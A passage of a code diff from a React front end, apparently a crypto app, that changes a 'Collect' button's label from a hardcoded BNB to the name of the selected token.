                                             disabled={collectModal.status === 'pending' || collectModal.status === 'confirming' || !collectAmount || parseFloat(collectAmount) <= 0}
                                             style={{ flex:1, padding:'14px', background: collectModal.status === 'pending' || collectModal.status === 'confirming' ? '#6b7280' : '#111827', color:'white', border:'none', borderRadius:'16px', fontWeight:900, fontSize:'14px', cursor:'pointer', display:'flex', alignItems:'center', justifyContent:'center', gap:'8px',
                                                 opacity: !collectAmount || parseFloat(collectAmount) <= 0 ? 0.5 : 1 }}>
-                                            💰 Collect {collectAmount} BNB
+                                            💰 Collect {collectAmount} {TOKEN_OPTIONS[collectToken]?.label}
                                         </button>
                                     </div>
                                 </div>
